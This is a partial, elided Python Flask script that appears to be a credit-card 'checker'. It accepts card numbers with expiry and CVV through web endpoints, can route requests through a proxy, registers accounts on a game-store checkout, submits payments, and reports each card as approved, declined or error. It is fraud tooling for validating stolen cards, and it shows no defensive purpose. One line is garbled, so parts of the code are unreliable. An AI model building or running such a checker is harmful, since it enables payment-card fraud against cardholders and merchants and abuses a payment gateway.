...
def check_card(card, player_id, proxy_url=None):
    ...
    try:
        ...
        }, json={"productId": PRODUCT_ID, "fields": {"playerid": player_id}}, timeout=30)
        
        if validate_response.status_code != 200:
            return {
                "card": cc_full, "player_id": player_id,
                "gate": "Zen Payments - GameSeal", "status": "ERROR",
        ...
        body = '\r\n'.join(parts) + f'\r\n--{boundary}--\r\n'
        sess.post(f"{BASE}/checkout/line-item/add", headers={
        ...
        resp = sess.post(f"{BASE}/account/register", headers={
            "Content-Type": "application/x-www-form-urlencoded",
            **html_headers, "Origin": BASE, "Referer": f"{BASE}/checkout/cart",
        }, data=reg_data, allow_redirects=True, timeout=30)
        ...
        sess.post(f"{BASE}/checkout/configure", headers={
            "Content-Type": "application/x-www-form-urlencoded",
        ...
        checkout_data = resp_checkout.json() if resp_checmeout detailed_message else STATUS_MESSAGES.get(final_status, "Payment processed.")
            ...
            return {
                "card": cc_full, "player_id": player_id,
                "gate": "Zen Payments - GameSeal", "price": price_str,
            ...
            return {
                "card": cc_full, "player_id": player_id,
                "gate": "Zen Payments - GameSeal", "price": price_str,
                "status": "DECLINED", "message": msg if msg else "Your card was declined.",
                "proxy_used": "true" if proxy_url else "false", "By": CREATOR
            }
        else:
            return {
                "card": cc_full, "player_id": player_id,
                "gate": "Zen Payments - GameSeal", "price": price_str,
                "status": "ERROR", "message": f"HTTP {resp.status_code} - Payment gateway error",
                "proxy_used": "true" if proxy_url else "false", "By": CREATOR
            }
        ...
        return {
            "card": cc_full, "player_id": player_id,
            "gate": "Zen Payments - GameSeal", "status": "ERROR",
            "message": str(e), "proxy_used": "true" if proxy_url else "false", "By": CREATOR
        }
...
def check_card_query():
    player_id = request.args.get('player_id') or (request.get_json() or {}).get('player_id')
    cc = request.args.get('cc') or (request.get_json() or {}).get('cc')
    proxy_url = request.args.get('proxy') or (request.get_json() or {}).get('proxy', '')
...
if __name__ == "__main__":
    ...
    ╠════════════════════════════════════════════════════════════════════════════╣
    ║  Endpoints:                                                                ║
    ║    GET  /SibaXCloud/Id={player_id}/cc={cc}/proxy={proxy}                   ║
    ║    GET  /SibaXCloud/Id={player_id}/cc={cc}                                 ║
    ║    GET  /health                                                            ║
    ╠════════════════════════════════════════════════════════════════════════════╣
    ║  Example:                                                                  ║
    ║    http://localhost:5000/SibaXCloud/Id=51458699098/cc=4111111111111111|12|2026|123/proxy=
    ║                                                                             ║
    ║  Creator: @babapakodumal (Supreme Leader)                                  ║
    ╚════════════════════════════════════════════════════════════════════════════╝
    """)
